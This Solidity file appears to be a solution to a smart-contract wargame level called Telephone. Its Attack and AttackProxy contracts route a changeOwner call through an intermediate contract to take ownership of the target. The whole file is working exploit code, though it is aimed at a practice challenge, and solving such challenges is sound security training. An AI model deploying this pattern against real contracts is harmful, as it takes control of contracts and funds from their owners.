// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//import "forge-std/src/console.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

interface IAttackProxy {
    function attack(address _owner) external;
}

contract AttackProxy {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _owner) external {
        target.changeOwner(_owner);
    }
}

contract Attack {
    IAttackProxy public proxy;

    constructor(address _proxy) {
        proxy = IAttackProxy(_proxy);
    }

    function attack() external {
        proxy.attack(address(this));
    }
}